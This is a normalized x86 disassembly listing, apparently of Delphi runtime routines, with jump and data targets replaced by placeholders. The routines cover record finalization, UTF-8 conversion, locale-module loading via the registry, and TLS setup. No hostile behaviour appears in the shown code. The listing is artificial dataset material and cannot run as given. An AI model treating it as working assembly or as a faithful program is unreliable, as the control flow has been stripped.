pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404ab0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4056e0
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405034
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402828
sub_404c0c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028c8
mov edx [ eax + esi ]
add eax ebx
call sub_4040c8
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404790
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404bf4
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028c8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404d28
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404c0c
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4056f8
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405070
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404d28
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4040c8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404790
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404bf4
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404d28
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404c0c
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4056f8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405070
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404e48
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e9c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404e94
jmp r-xdata
mov al 0x4
call sub_402828
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402828
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40270c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402cbc
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404afc
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028c8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402cbc
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404e7c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404e9c
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405034
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026ec
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404afc
sub_405070
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405034
pop edx
pop eax
sub_405098
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012dc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4050c8
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40126c
mov eax esp
mov dl 0x1
call sub_405304
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405110
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_4050c8
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_40514c
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401274
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40127c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405138
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405138
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405138
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40124c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401244
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405304
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40126c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405409
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_40514c
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40128c
push eax
call sub_401264
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_4055a4
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
jmp r-xdata
sub_405604
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_40563f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405670
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4056d4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405604
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4056db
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4056f8
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405724
test edx edx
je sub_4056e0
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402828
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4057c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401304
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4057f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4058cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405a04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405aa3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404074
mov eax ebx
xor edx edx
call sub_4048cc
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405aaa
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
call sub_4048c0
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4046c0
mov eax ebx
call sub_4048c0
push eax
mov eax [ ebp - 0x4 ]
call sub_404334
inc eax
push eax
mov eax ebx
call sub_4048b0
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
pop ecx
pop edx
call sub_4057f0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404074
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4046c0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040c8
sub_405ab0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b47
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404754
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b4e
lea eax [ ebp - 0x4 ]
call sub_404754
retn
mov eax ebx
call sub_404334
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_40499c
mov eax ebx
call sub_404334
push eax
mov eax [ ebp - 0x4 ]
call sub_4048c0
inc eax
push eax
mov eax ebx
call sub_404534
push eax
mov eax [ ebp - 0x4 ]
call sub_4048b0
pop ecx
pop edx
call sub_4058cc
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404754
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40499c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404790
sub_405b54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b97
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4048a0
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405a04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b9e
lea eax [ ebp - 0x4 ]
call sub_404754
retn
sub_405ba4
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40426c
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405110
push eax
call sub_40129c
mov ecx eax
mov edx esp
mov eax esi
call sub_404164
jmp r-xdata
sub_405bfc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405c62
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401264
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4042e4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402cdc
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c69
lea eax [ ebp - 0x10 ]
call sub_404074
retn
xor ebx ebx
sub_405c70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405cba
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405cc1
retn
mov eax rw-data
call sub_402b18
mov eax rw-data
call sub_402b18
mov eax rw-data
call sub_402b18
call sub_401ad0
sub_405cc4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404e40
call sub_4030e8
test al al
je r-xdata
call sub_4031dc
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40131c
mov [ rw-data ] eax
call sub_401314
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403118
call sub_40128c
call sub_405bfc
mov [ rw-data ] eax
call sub_401314
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40128c
call sub_405bfc
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40130c
mov [ rw-data ] eax
sub_405dcc
push ebx
call sub_405dc4
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405db8
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403fe4
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403fe4
sub_405e10
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405dcc
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405e5c
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405d98
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405e50
mov edx rw-data
mov eax ebx
call sub_403d38
pop ebx
retn
sub_405ea0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ec5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ecc
retn
sub_405efc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
